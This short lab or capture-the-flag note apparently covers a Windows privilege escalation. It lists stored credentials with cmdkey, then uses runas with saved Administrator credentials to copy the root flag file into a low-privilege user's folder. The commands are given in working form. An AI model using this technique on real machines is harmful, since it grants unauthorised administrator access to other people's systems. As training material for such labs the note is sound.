List available credentials:
```cmd
cmdkey /list
```

List available credentials:
```cmd
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"
```
Args:
`/user`: User (from command above)
`/savecred`: Use the credentials stored on the machine
The string in quotation marks is the command to be executed:
	Use cmd.exe to execute the command TYPE (similar to echo).
	The command basically echoes the content of `C:\Users\Administrator\Desktop\root.txt` and writes it into the file `C:\Users\security\root.txt`, i.e. extract the Root flag into a file we can read with our user.

>[!Note]
>*Runas* is similar to *sudo*, except we can use it without a password if the credentials are already stored on the machine.
